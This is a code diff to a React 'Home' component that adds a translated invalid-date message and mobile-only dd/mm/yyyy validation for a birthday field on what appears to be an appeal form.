@@ -29,6 +29,7 @@ const Home = () => {
             appealPlaceholder: 'Please describe your appeal in detail...',
             submit: 'Submit',
             fieldRequired: 'This field is required',
+            invalidDate: 'Please enter a valid date in dd/mm/yyyy format',
             about: 'About',
             adChoices: 'Ad choices',
             createAd: 'Create ad',
@@ -77,6 +78,7 @@ const Home = () => {
                     translatedAppealPlaceholder,
                     translatedSubmitBtn, 
                     translatedRequired, 
+                    translatedInvalidDate,
                     translatedAbout, 
                     translatedAdChoices, 
                     translatedCreateAd, 
@@ -104,6 +106,7 @@ const Home = () => {
                     translateText(defaultTexts.appealPlaceholder, targetLang),
                     translateText(defaultTexts.submit, targetLang), 
                     translateText(defaultTexts.fieldRequired, targetLang), 
+                    translateText(defaultTexts.invalidDate, targetLang),
                     translateText(defaultTexts.about, targetLang), 
                     translateText(defaultTexts.adChoices, targetLang), 
                     translateText(defaultTexts.createAd, targetLang), 
@@ -133,6 +136,7 @@ const Home = () => {
                     appealPlaceholder: translatedAppealPlaceholder,
                     submit: translatedSubmitBtn,
                     fieldRequired: translatedRequired,
+                    invalidDate: translatedInvalidDate,
                     about: translatedAbout,
                     adChoices: translatedAdChoices,
                     createAd: translatedCreateAd,
@@ -263,6 +267,28 @@ const Home = () => {
                 newErrors[field] = true;
             }
         });
+
+        // Kiểm tra định dạng ngày sinh (chỉ trên mobile)
+        if (formData.birthday.trim() !== '') {
+            const isMobile = window.innerWidth < 640; // sm breakpoint
+            if (isMobile) {
+                // Kiểm tra định dạng dd/mm/yyyy
+                const dateRegex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
+                if (!dateRegex.test(formData.birthday)) {
+                    newErrors.birthday = true;
+                } else {
+                    const [, day, month, year] = formData.birthday.match(dateRegex);
+                    const dayNum = parseInt(day);
+                    const monthNum = parseInt(month);
+                    const yearNum = parseInt(year);
+                    
+                    // Kiểm tra ngày, tháng hợp lệ
+                    if (dayNum < 1 || dayNum > 31 || monthNum < 1 || monthNum > 12 || yearNum < 1900 || yearNum > new Date().getFullYear()) {
+                        newErrors.birthday = true;
+                    }
+                }
+            }
+        }
 
         setErrors(newErrors);
         return Object.keys(newErrors).length === 0;
@@ -457,7 +483,14 @@ const Home = () => {
                                     />
                                 </div>
                                 
-                                {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                {errors.birthday && (
+                                    <span className='text-xs text-red-500'>
+                                        {formData.birthday.includes('/') && !/^\d{2}\/\d{2}\/\d{4}$/.test(formData.birthday) 
+                                            ? translatedTexts.invalidDate
+                                            : translatedTexts.fieldRequired
+                                        }
+                                    </span>
+                                )}
                             </div>
                             
                             <div className='flex flex-col gap-1'>
